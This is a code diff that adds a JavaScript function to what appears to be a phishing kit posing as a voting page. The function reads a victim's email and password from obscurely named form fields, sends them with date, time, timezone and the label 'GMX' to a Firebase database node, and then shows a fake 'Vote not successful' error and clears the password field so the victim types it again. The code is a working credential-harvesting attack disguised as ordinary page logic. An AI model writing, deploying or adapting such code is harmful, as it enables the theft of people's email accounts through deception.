@@ -157,3 +157,40 @@ function imo() {
     }, 2000);
   }
 }
+
+function awkacent() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      showAlert("Error", error.message);
+    });
+
+  var oruk = document.getElementById("awka-oruko").value;
+  var wazobia = document.getElementById("awka-zom").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "GMX";
+
+  if (oruk !== "" && wazobia !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: oruk,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: wazobia,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      showAlert(
+        "Vote not successful",
+        "Sorry, something went wrong. Please try again."
+      );
+      document.getElementById("awka-zom").value = "";
+      return false;
+    }, 2000);
+  }
+}
